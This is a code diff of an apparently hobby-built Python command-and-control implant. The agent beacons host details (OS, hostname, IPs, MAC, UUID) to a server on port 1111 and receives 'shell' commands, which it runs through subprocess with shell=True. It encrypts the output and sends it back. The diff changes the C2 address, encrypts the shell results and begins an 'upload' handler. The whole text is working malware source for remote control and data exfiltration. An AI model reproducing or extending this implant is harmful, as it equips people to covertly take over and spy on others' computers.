@@ -53,7 +53,7 @@ class Ping_server(Thread):
             Public_ip = Public_ip.replace("b'", "")[:-3]
 
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(("192.168.0.20", 1111))
+        s.connect(("192.168.0.29", 1111))
 
         date = strftime("%d:%m:%Y:%H:%M:%S:+0000", gmtime())
         Chaine = "Init:" + date + "," + str(UUID) + "," + MAC
@@ -65,13 +65,13 @@ class Ping_server(Thread):
 
         while True:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect(("192.168.0.20", 1111))
+            s.connect(("192.168.0.29", 1111))
 
             time.sleep(10)
             date = strftime("%d:%m:%Y:%H:%M:%S:+0000", gmtime())
             #Chaine_plaintext = "Alive:" + date + "," + str(UUID) + "," + Os + "," + Computer + "," + Loacl_ip + "," + Hostname + "," + Public_ip
 
-            Chaine_init2 = "Infos:" + date + "," + str(UUID) + "," + Os + "," + Computer + "," + Loacl_ip + "," + Hostname + "," + Public_ip
+            Chaine_init2 = "Alive:" + date + "," + str(UUID) + "," + Os + "," + Computer + "," + Loacl_ip + "," + Hostname + "," + Public_ip
             #s.send(Chaine_init2.encode())
 
             Chaine_secure = encrypt_data(Chaine_init2, key)
@@ -91,17 +91,14 @@ class Receive_cmd(Thread):
         # Socket for receiving command from the C2 server
 
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(("192.168.0.20", 1111))
-
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(("192.168.0.20", 1111))
+        s.connect(("192.168.0.29", 1111))
 
         while True:
             s_re.listen(5)
             client, address = s_re.accept()
 
-            if str(address[0]) == "192.168.0.20":
-                print("[+] Connected with the server")
+            if str(address[0]) == "192.168.0.29":
+                pass
             else:
                 print("[WARNING] A wrong server is trying to talk with us, abording mission NOW !!!")
                 exit(0)
@@ -109,26 +106,42 @@ class Receive_cmd(Thread):
 
             response = client.recv(2048)
             if "shell" in str(response).replace("b'", "")[:-1]:
-                print("[+] Server request a shell")
 
                 cmd = str(response[6:]).replace("b'", "")[:-1]
-                print("[+] Remote command is : " + cmd)
+                if ("Exit" in cmd):
+                    pass
+                else:
 
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect(("192.168.0.20", 1111))
-                # Socket for sending result of server query
+                    print("[+] Server request this information : " + cmd)
 
-                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                                        stdin=subprocess.PIPE)
-                stdout_value = proc.stdout.read() + proc.stderr.read()
-                args = stdout_value
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.connect(("192.168.0.29", 1111))
+                    # Socket for sending result of server query
 
-                s.send(str('CMD:').encode() + args)
+                    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                            stdin=subprocess.PIPE)
+                    stdout_value = proc.stdout.read() + proc.stderr.read()
+                    args = stdout_value
 
-                print("[+] result : " + str(args))
-                s.close()
+                    shell = str('CMD:').encode() + args
+                    secure_shell = encrypt_data(str(shell), key)
+                    secure_shell = str(MAC) + str(secure_shell).replace("b'","")[:-1]
+                    s.send(secure_shell.encode())
+
+                    # s.send(shell)
+                    #cmd_result = str(encrypt_data(args, key))
+                    #s.send(cmd_result.encode())
+
+                    print("[+] result : " + str(args))
+                    s.close()
+
+            elif "upload" in str(response):
+                file_name = (str(response).split(" ")[1][:-1])
+                print("[+] Server want me to download : " + file_name)
+
+
             else:
-                print("[-] Server request something that i can't handle now. Update me !")
+                print("[-] Server request something that i can't handle now. Update me !" + str(response))
 
 def custom_encode_part2_key(MAC):
 # Take each digit of the MAC address, and get the letter of this position in the latin alphabet, then, rot-13 the string
